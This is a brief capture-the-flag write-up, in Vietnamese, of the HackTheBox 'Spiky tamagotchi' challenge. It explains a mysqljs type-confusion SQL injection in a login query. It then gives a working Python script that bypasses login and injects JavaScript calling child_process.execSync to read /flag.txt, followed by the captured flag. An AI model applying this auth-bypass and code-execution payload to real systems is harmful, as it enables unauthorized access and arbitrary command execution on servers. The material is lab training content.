# Spiky tamagotchi

Vul sqli + RCE


```js
    async loginUser(user, pass) {
        return new Promise(async(resolve, reject) => {
            let stmt = 'SELECT username FROM users WHERE username = ? AND password = ?';
            this.connection.query(stmt, [user, pass], (err, result) => {
                if (err || result.length == 0)
                    reject(err)
                resolve(result)
            })
        });
    }
```
[sqli](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4) bởi vì user và pass được truyền vào ở query() mà không kiểm tra kiểu dữ liệu:

```py
import requests

s = requests.Session()
burp0_url = "http://139.59.163.221:31505/api/login"
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36", "Content-Type": "application/json", "Accept": "*/*", "Origin": "http://134.209.177.202:30560", "Referer": "http://134.209.177.202:30560/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
burp0_json={"password": {"password": 1}, "username": {"username": 1}}
s.post(burp0_url, headers=burp0_headers, json=burp0_json)


burp0_url = "http://139.59.163.221:31505/api/activity"
burp0_json={"activity": "', hp=1, w=1, hs=1){ m=this.constructor.constructor(`return process.mainModule.require('child_process').execSync('cat /flag.txt', {encoding:'utf-8'})`)(); hp=5; w=3; hs=6;return {m, hp, w, hs}//", "happiness": "50", "health": "60", "weight": "42"}
r = s.post(burp0_url, headers=burp0_headers, json=burp0_json)
print(r.text)
```

**HTB{3sc4p3d_bec0z_n0_typ3_ch3ck5}**